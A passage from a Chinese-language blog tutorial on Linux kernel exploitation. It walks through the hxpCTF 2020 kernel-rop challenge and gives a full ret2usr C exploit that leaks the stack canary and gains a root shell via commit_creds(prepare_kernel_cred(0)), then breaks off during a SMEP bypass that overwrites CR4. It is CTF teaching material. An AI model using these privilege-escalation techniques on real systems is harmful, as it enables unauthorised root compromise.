<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Kernel-Pwn</title>
    <link href="/2023/06/28/Kernel-Pwn/"/>
    <url>/2023/06/28/Kernel-Pwn/</url>
    
    <content type="html"><![CDATA[<h1 id="Linux-Kernel-介绍"><a href="#Linux-Kernel-介绍" class="headerlink" title="Linux Kernel 介绍"></a>Linux Kernel 介绍</h1><p>Linux 内核是 Linux 操作系统的核心组件，它提供了操作系统的基本功能和服务。它是一个开源软件，由 Linus Torvalds 在 1991 年开始开发，并得到了全球广泛的贡献和支持。</p><p>Linux 内核的主要功能包括进程管理、内存管理、文件系统、网络通信、设备驱动程序等。它负责管理计算机硬件和软件资源，并为应用程序提供必要的基础支持。Linux 内核是一个模块化的系统，可以根据需要加载和卸载各种驱动程序和功能模块。</p><h1 id="Linux-Kernel-环境"><a href="#Linux-Kernel-环境" class="headerlink" title="Linux Kernel 环境"></a>Linux Kernel 环境</h1><ul><li>vmlinuz或bzImage：linux内核的压缩镜像</li><li>vmlinux：linux内核的符号表</li><li>initramfs.cpio.gz：文件系统，有系统启动的信息</li><li>run.sh：qemu启动的shell脚本，里面有linux内核开启了哪些保护</li></ul><h1 id="Linux-Kernel-gadget获取"><a href="#Linux-Kernel-gadget获取" class="headerlink" title="Linux Kernel gadget获取"></a>Linux Kernel gadget获取</h1><p>通过压缩的linux内核镜像获取符号表</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">./extract-image.sh ./vmlinuz &gt; vmlinux<br></code></pre></td></tr></table></figure><p>extract-image.sh</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/sh</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">SPDX-License-Identifier: GPL-2.0-only</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">----------------------------------------------------------------------</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">extract-vmlinux - Extract uncompressed vmlinux from a kernel image</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"></span><br><span class="language-bash"><span class="hljs-comment"># Inspired from extract-ikconfig</span></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">(c) 2009,2010 Dick Streefland &lt;dick@streefland.net&gt;</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"></span><br><span class="language-bash"><span class="hljs-comment"># (c) 2011      Corentin Chary &lt;corentin.chary@gmail.com&gt;</span></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"></span><br><span class="language-bash"><span class="hljs-comment"># ----------------------------------------------------------------------</span></span><br><br>check_vmlinux()<br>&#123;<br><span class="hljs-meta prompt_"># </span><span class="language-bash">Use readelf to check <span class="hljs-keyword">if</span> it<span class="hljs-string">&#x27;s a valid ELF</span></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-string">TODO: find a better to way to check that it&#x27;</span>s really vmlinux</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">      and not just an elf</span><br>readelf -h $1 &gt; /dev/null 2&gt;&amp;1 || return 1<br><br>cat $1<br>exit 0<br>&#125;<br><br>try_decompress()<br>&#123;<br><span class="hljs-meta prompt_"># </span><span class="language-bash">The obscure use of the <span class="hljs-string">&quot;tr&quot;</span> filter is to work around older versions of</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-string">&quot;grep&quot;</span> that report the byte offset of the line instead of the pattern.</span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">Try to find the header (<span class="hljs-variable">$1</span>) and decompress from here</span><br>forpos in `tr &quot;$1\n$2&quot; &quot;\n$2=&quot; &lt; &quot;$img&quot; | grep -abo &quot;^$2&quot;`<br>do<br>pos=$&#123;pos%%:*&#125;<br>tail -c+$pos &quot;$img&quot; | $3 &gt; $tmp 2&gt; /dev/null<br>check_vmlinux $tmp<br>done<br>&#125;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">Check invocation:</span><br>me=$&#123;0##*/&#125;<br>img=$1<br>if[ $# -ne 1 -o ! -s &quot;$img&quot; ]<br>then<br>echo &quot;Usage: $me &lt;kernel-image&gt;&quot; &gt;&amp;2<br>exit 2<br>fi<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">Prepare temp files:</span><br>tmp=$(mktemp /tmp/vmlinux-XXX)<br>trap &quot;rm -f $tmp&quot; 0<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">That didn<span class="hljs-string">&#x27;t work, so retry after decompression.</span></span><br>try_decompress &#x27;\037\213\010&#x27; xy    gunzip<br>try_decompress &#x27;\3757zXZ\000&#x27; abcde unxz<br>try_decompress &#x27;BZh&#x27;          xy    bunzip2<br>try_decompress &#x27;\135\0\0\0&#x27;   xxx   unlzma<br>try_decompress &#x27;\211\114\132&#x27; xy    &#x27;lzop -d&#x27;<br>try_decompress &#x27;\002!L\030&#x27;   xxx   &#x27;lz4 -d&#x27;<br>try_decompress &#x27;(\265/\375&#x27;   xxx   unzstd<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-string">Finally check for uncompressed images or objects:</span></span><br>check_vmlinux $img<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-string">Bail out:</span></span><br>echo &quot;$me: Cannot find vmlinux.&quot; &gt;&amp;2<br></code></pre></td></tr></table></figure><h2 id="ROPgadget获取"><a href="#ROPgadget获取" class="headerlink" title="ROPgadget获取"></a>ROPgadget获取</h2><p>不建议用ROPgadget，速度比较慢</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">ROPgadget --binary ./vmlinux &gt; gadgets.txt<br></code></pre></td></tr></table></figure><h2 id="Ropper获取"><a href="#Ropper获取" class="headerlink" title="Ropper获取"></a>Ropper获取</h2><p>使用ropper速度会比较快</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">ropper --file ./vmlinux --nocolor &gt; g<br></code></pre></td></tr></table></figure><h2 id="直接获取"><a href="#直接获取" class="headerlink" title="直接获取"></a>直接获取</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">./vmlinux &gt; gadgets.txt<br></code></pre></td></tr></table></figure><p>然后搜索</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">cat gadgets.txt | grep &#x27;pop&#x27;<br></code></pre></td></tr></table></figure><h1 id="文件系统"><a href="#文件系统" class="headerlink" title="文件系统"></a>文件系统</h1><h2 id="解包"><a href="#解包" class="headerlink" title="解包"></a>解包</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">mkdir initramfs<br>cd initramfs<br>cp ../initramfs.cpio.gz .<br>gunzip ./initramfs.cpio.gz<br>cpio -idm &lt; ./initramfs.cpio<br>rm initramfs.cpio<br></code></pre></td></tr></table></figure><h2 id="打包"><a href="#打包" class="headerlink" title="打包"></a>打包</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">gcc -o exploit -static $1<br>mv ./exploit ./initramfs<br>cd initramfs<br>find . -print0 \<br>| cpio --null -ov --format=newc \<br>| gzip -9 &gt; initramfs.cpio.gz<br>mv ./initramfs.cpio.gz ../<br></code></pre></td></tr></table></figure><h1 id="Linux-Kernel的保护措施"><a href="#Linux-Kernel的保护措施" class="headerlink" title="Linux Kernel的保护措施"></a>Linux Kernel的保护措施</h1><ul><li>Kernel stack cookies【canary】：防止内核栈溢出</li><li>Kernel address space layout【KASLR】：内核地址随机化</li><li>Supervisor mode execution protection【SMEP】：内核态中不能执行用户空间的代码。在内核中可以将CR4寄存器的第20比特设置为1，表示启用。<ul><li>开启：在-cpu参数中设置+smep</li><li>关闭：nosmep添加到-append</li></ul></li><li>Supervisor Mode Access Prevention【SMAP】：在内核态中不能读写用户页的数据。在内核中可以将CR4寄存器的第21比特设置为1，表示启用。<ul><li>开启：在-cpu参数中设置+smap</li><li>关闭：nosmap添加到-append</li></ul></li><li>Kernel page-table isolation【KPTI】：将用户页与内核页分隔开，在用户态时只使用用户页，而在内核态时使用内核页。<ul><li>开启：kpti&#x3D;1</li><li>关闭：nopti添加到-append</li></ul></li></ul><h1 id="hxpCTF-2020-kernel-rop"><a href="#hxpCTF-2020-kernel-rop" class="headerlink" title="hxpCTF 2020 kernel-rop"></a>hxpCTF 2020 kernel-rop</h1><p>这里使用hxpCTF 2020的内核题作为例子，对内核中的保护以及如何绕过做简单介绍。</p><p>项目地址：<a href="https://github.com/h0pe-ay/Kernel-Pwn">https://github.com/h0pe-ay/Kernel-Pwn</a></p><h2 id="hackme-read"><a href="#hackme-read" class="headerlink" title="hackme_read"></a>hackme_read</h2><p>这个函数会将内核栈的数据拷贝到用户空间中去，因此可以利用改函数泄露内核栈的信息</p><p><img src="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202307021217974.png" alt="image-20230702121705874"></p><h2 id="hackme-write"><a href="#hackme-write" class="headerlink" title="hackme_write"></a>hackme_write</h2><p>hackme_write这个函数则是从用户空间拷贝数据到内核栈中，但是变量V5的存储空间是远远小于从用户态中可以传的数据的大小，因此导致了出现内核态栈溢出。</p><p><img src="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202307021220193.png" alt="image-20230702122026128"></p><h1 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h1><p>首先在启动脚本<code>run.sh</code>中加入<code>-s</code>的参数，使得可以使用gdb对qemu进行调试</p><p>其次可以使用<code>lsmod</code>查看模块加载的基址，这里需要注意的是需要先将启动脚本中的权限改为0</p><p><img src="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202307021233467.png" alt="image-20230702123330423"></p><p>否则直接运行不会显示模块的地址，结果如下</p><p><img src="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202307021228738.png" alt="image-20230702122819716"></p><p>将权限修改为0之后，就可以正常显示了</p><p><img src="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202307021234614.png" alt="image-20230702123453594"></p><p>然后通过gdb进行调试时则可以将模块的基地址加入进去，使用<code>add-symbol-file hackme.ko 0xffffffffc0000000</code></p><p><img src="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202307021236397.png" alt="image-20230702123613363"></p><p>接着是从题目给的内核镜像中提取符号信息，通过<code>./extract-image.sh vmlinuz &gt; vmlinux</code>，并且也加载到gdb中</p><p><img src="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202307021238200.png" alt="image-20230702123835179"></p><p>最后就可以开启远程调试了，<code>target remote:1234</code></p><p><img src="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202307021239361.png" alt="image-20230702123907341"></p><p>这里需要注意的是<code>ida</code>中显示的地址可能不准确，因此可以直接在<code>qemu</code>中查看，<code>cat /proc/kallsyms | grep hackme</code></p><p><img src="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202307021240536.png" alt="image-20230702124044507"></p><p>在<code>hackme_write</code>中打下断点</p><p><img src="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202307021241848.png" alt="image-20230702124148826"></p><p>这里我遇到个问题是在遇到<code>push</code>指令时不能够使用<code>ni</code>进行跟踪，而是需要<code>si</code>，否则会跑飞。</p><p>使用<code>ni</code>进行单步调试，程序会直接运行，无法断下来。</p><p><img src="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202307021243107.png" alt="image-20230702124306060"></p><p>使用<code>si</code>则可以单步</p><p><img src="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202307021244759.png" alt="image-20230702124417711"></p><p>至此就可以对hackme.ko的模块进行调试了。</p><h1 id="未开启保护"><a href="#未开启保护" class="headerlink" title="未开启保护"></a>未开启保护</h1><p>首先是关闭内核中所有的保护，在遇到内核栈溢出时需要怎么完成漏洞利用。</p><h2 id="run-sh"><a href="#run-sh" class="headerlink" title="run.sh"></a>run.sh</h2><p>在<code>append</code>使用使用<code>nosmap</code>、<code>nosemp</code>、<code>nokaslr</code>、<code>nopti</code>关闭<code>smap</code>、<code>semp</code>、<code>kaslr</code>以及<code>kpti</code>的保护</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell">qemu-system-x86_64 \<br>    -m 128M \<br>    -cpu kvm64\<br>    -kernel vmlinuz \<br>    -initrd initramfs.cpio.gz \<br>    -hdb flag.txt \<br>    -snapshot \<br>    -nographic \<br>    -monitor /dev/null \<br>    -no-reboot \<br>    -append &quot;console=ttyS0 nosmap nosemp nokaslr nopti  quiet panic=1&quot; \<br>    -s<br></code></pre></td></tr></table></figure><h2 id="ret2user"><a href="#ret2user" class="headerlink" title="ret2user"></a>ret2user</h2><p>由于题目没有开启任何保护，因此首要使用的方法就是利用栈溢出修改内核栈上的返回地址。</p><p>首先检查一下保护，发现hackme.ko开启的canary的保护，因此想要完成栈溢出，首先需要泄露canary，由于题目本身就存在地址泄露功能，因此只要确保我们读取的内容包括canary的值即可</p><p><img src="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202307021257556.png" alt="image-20230702125757530"></p><p>在<code>hackme_read</code>中打下断点，查看变量<code>v6</code>中存储了什么值，由于程序是通过<code>memcpy</code>进行数据拷贝的，因此直接查看<code>RSI</code>寄存器对应的数据</p><p><img src="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202307021303486.png" alt="image-20230702130338435"></p><p>可以发现<code>canary</code>的值就在其中，因此利用<code>hackmeread</code>这个函数就可以将数据泄露出来</p><p><img src="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202307021304161.png" alt="image-20230702130458127"></p><p><img src="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202307021306415.png" alt="image-20230702130611386"></p><p>这里需要注意的是，虽然题目限制的长度是0x1000，但是并不能将拷贝0x1000的长度，因为可能会在不可读的地址中获取数据，导致了执行错误。</p><p><img src="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202307021310262.png" alt="image-20230702131058237"></p><p>在泄露<code>canary</code>后就可以劫持程序执行流程了，与用户态不同，在内核态需要先获取<code>root</code>凭证，在切换到用户态下。</p><ul><li><code>prepare_kernel_cred</code>函数<ul><li><code>prepare_kernel_cred</code> 函数用于为内核中的进程（也就是进程的内核线程）创建一个新的 <code>cred</code> 结构体，该结构体包含有关进程的安全上下文信息，例如 UID、GID、capabilities 等。</li></ul></li><li><code>commit_creds</code>函数<ul><li><code>commit_creds</code> 函数接受一个指向 <code>cred</code> 结构体的指针，并将其分配给当前进程。该函数通常在进程启动时调用，以确保进程被正确配置以拥有所需的权限。</li></ul></li></ul><p>因此调用<code>prepare_kernel_cred(0)</code>可以获取<code>root</code>权限的凭证，接着调用<code>commit_creds</code>函数，就可以将当前进程的特权修改为<code>root</code>。即指向<code>commit_creds(prepare_kernel_cred(0))</code></p><p>在获取完<code>root</code>之后则需要调用<code>swags</code>指令进行<code>GS</code>寄存器的切换，即将<code>g_base</code>与<code>k_gs_base</code>的值进行交换，<code>swapgs</code> 是一个汇编指令，用于在执行内核代码期间切换当前 CPU 的内核栈和 GS 寄存器。完成交换之后才能确保在用户态的寻址不会存在问题。</p><p>执行<code>swags</code>指令之前</p><p><img src="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202307021349214.png" alt="image-20230702134909167"></p><p>执行<code>swags</code>指令之后</p><p><img src="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202307021349764.png" alt="image-20230702134952702"></p><p>最后则是切换回用户态，<code>iretq</code> 指令是 x86 架构下用于从中断处理程序（或系统调用处理程序）返回到用户空间的指令。它是 <code>iret</code> 指令的 64 位版本，用于在 64 位模式下使用。</p><p><code>iretq</code> 指令有以下三个功能：</p><ol><li>恢复处理器的标志寄存器 (EFLAGS) 的值，以便返回到原始程序的执行上下文。</li><li>恢复程序计数器 (Instruction Pointer, RIP) 的值，以便返回到原始程序的执行点。</li><li>恢复栈指针 (Stack Pointer, RSP) 的值，以便将堆栈指针切换回用户栈上。</li></ol><p><code>iretq</code>还原的值的顺序为<code>RIP|CS|RFLAGS|SP|SS</code>，那么在<code>iret</code>指令中按顺序填充<code>RIP</code>、<code>CS</code>、<code>RFLASG</code>、<code>RSP</code>以及<code>SS</code>的值即可，因此在执行<code>iretq</code>之前需要将在用户态下将这些值进行保存。并且<code>RIP</code>指向的值为<code>system(&quot;/bin/sh&quot;)</code>函数的地址即可。</p><p>保存寄存器的汇编代码如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs assembly">__asm(<br>&quot;.intel_syntax noprefix;&quot;<br>&quot;mov user_cs, cs;&quot;<br>&quot;mov user_sp, rsp;&quot;<br>&quot;mov user_ss, ss;&quot;<br>&quot;pushf;&quot;<br>&quot;pop user_rflags;&quot;<br>&quot;.att_syntax;&quot;<br>);<br></code></pre></td></tr></table></figure><p>在<code>iretq</code>指令后跟随的值如下</p><p><img src="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202307021404521.png"></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>因此最后构造的<code>exp</code>如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">0xffffffff814c6410 T commit_creds </span><br><span class="hljs-comment">0xffffffff814c67f0 T prepare_kernel_cred </span><br><span class="hljs-comment">*/</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> user_sp, user_cs, user_ss, user_rflags;<br><span class="hljs-type">void</span> <span class="hljs-title function_">save_user_land</span><span class="hljs-params">()</span><br>&#123;<br>__asm__(<br><span class="hljs-string">&quot;.intel_syntax noprefix;&quot;</span><br><span class="hljs-string">&quot;mov user_cs, cs;&quot;</span><br><span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span><br><span class="hljs-string">&quot;mov user_ss, ss;&quot;</span><br><span class="hljs-string">&quot;pushf;&quot;</span><br><span class="hljs-string">&quot;pop user_rflags;&quot;</span><br><span class="hljs-string">&quot;.att_syntax;&quot;</span><br>);<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Saved userland registers&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[#] cs: 0x%lx \n&quot;</span>, user_cs);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[#] ss: 0x%lx \n&quot;</span>, user_ss);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[#] rsp: 0x%lx \n&quot;</span>, user_sp);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[#] rflags: 0x%lx \n\n&quot;</span>, user_rflags);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">backdoor</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;****getshell****&quot;</span>);<br>system(<span class="hljs-string">&quot;id&quot;</span>);<br>system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> user_rip = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)backdoor;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">lpe</span><span class="hljs-params">()</span><br>&#123;<br>__asm(<br><span class="hljs-string">&quot;.intel_syntax noprefix;&quot;</span><br><span class="hljs-string">&quot;movabs rax, 0xffffffff814c67f0;&quot;</span> <span class="hljs-comment">//prepare_kernel_cred</span><br><span class="hljs-string">&quot;xor rdi, rdi;&quot;</span><br><span class="hljs-string">&quot;call rax;&quot;</span> <span class="hljs-comment">//prepare_kernel_cred(0);</span><br><span class="hljs-string">&quot;mov rdi, rax;&quot;</span><br><span class="hljs-string">&quot;mov rax, 0xffffffff814c6410;&quot;</span><br><span class="hljs-string">&quot;call rax;&quot;</span><br><span class="hljs-string">&quot;swapgs;&quot;</span><br><span class="hljs-string">&quot;mov r15, user_ss;&quot;</span><br><span class="hljs-string">&quot;push r15;&quot;</span><br><span class="hljs-string">&quot;mov r15, user_sp;&quot;</span><br><span class="hljs-string">&quot;push r15;&quot;</span><br><span class="hljs-string">&quot;mov r15, user_rflags;&quot;</span><br><span class="hljs-string">&quot;push r15;&quot;</span><br><span class="hljs-string">&quot;mov r15, user_cs;&quot;</span><br><span class="hljs-string">&quot;push r15;&quot;</span><br><span class="hljs-string">&quot;mov r15, user_rip;&quot;</span><br><span class="hljs-string">&quot;push r15;&quot;</span><br><span class="hljs-string">&quot;iretq;&quot;</span><br><span class="hljs-string">&quot;.att_syntax;&quot;</span><br>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i, index = <span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> fd = open(<span class="hljs-string">&quot;/dev/hackme&quot;</span>, O_RDWR);<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> buf[<span class="hljs-number">256</span>];<br>read(fd, buf, <span class="hljs-number">8</span>*<span class="hljs-number">11</span>);<br><span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">11</span>; i++)<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;i:%d:data:0x%lx\n&quot;</span>,i, buf[i]);<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> canary = buf[<span class="hljs-number">2</span>];<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> leak_addr = buf[<span class="hljs-number">10</span>];<br>save_user_land();<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> payload[<span class="hljs-number">256</span>];<br><span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; (<span class="hljs-number">16</span>); i ++)<br>payload[index++] = <span class="hljs-number">0</span>;<br>payload[index++] = canary;<br>payload[index++] = <span class="hljs-number">0</span>;<br>payload[index++] = <span class="hljs-number">0</span>;<br>payload[index++] = <span class="hljs-number">0</span>;<br>payload[index++] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)lpe;<br>write(fd, payload, index * <span class="hljs-number">8</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="绕过SMEP"><a href="#绕过SMEP" class="headerlink" title="绕过SMEP"></a>绕过SMEP</h1><p><code>SMEP</code>保护是防止内核执行用户空间的代码，而上述的<code>exp</code>则是将利用过程是将汇编语言写在用户空间中，因此在<code>SMEP</code>的保护下，上述的利用会失效。下面将介绍绕过<code>SMEP</code>的几种方法。</p><h2 id="run-sh-1"><a href="#run-sh-1" class="headerlink" title="run.sh"></a>run.sh</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">qemu-system-x86_64 \<br>    -m <span class="hljs-number">128</span>M \<br>    -cpu kvm64,+smep\<br>    -kernel vmlinuz \<br>    -initrd initramfs.cpio.gz \<br>    -hdb flag.txt \<br>    -snapshot \<br>    -nographic \<br>    -monitor /dev/null \<br>    -no-reboot \<br>    -append <span class="hljs-string">&quot;console=ttyS0 nosmap  nokaslr nopti  quiet panic=1&quot;</span> \<br>    -s<br></code></pre></td></tr></table></figure><h2 id="修改CR4寄存器"><a href="#修改CR4寄存器" class="headerlink" title="修改CR4寄存器"></a>修改CR4寄存器</h2><p>前面说过开启<code>SMEP</code>保护实际是将<code>CR4</code>寄存器的第20比特位置为1</p><p><img src="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202307021426116.png" alt="image-20230702142637070"></p><p>那么一个简单的想法就是将<code>CR4</code>寄存器的第20比特位重写为0，关闭<code>SMEP</code>的保护就可以使用上述的利用手法了。那么写<code>cr4</code>寄存器的是通过<code>native_write_cr4</code>函数，将需要改写的值以参数的形式传入进去，因此此时需要一个<code>pop rdi; ret</code>的<code>gadget</code>。</p><p><img src="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202307021435126.png" alt="image-20230702143530084"></p><p>找到<code>native_write_cr4</code>函数</p><p><img src="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202307021437727.png" alt="image-20230702143701700"></p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span 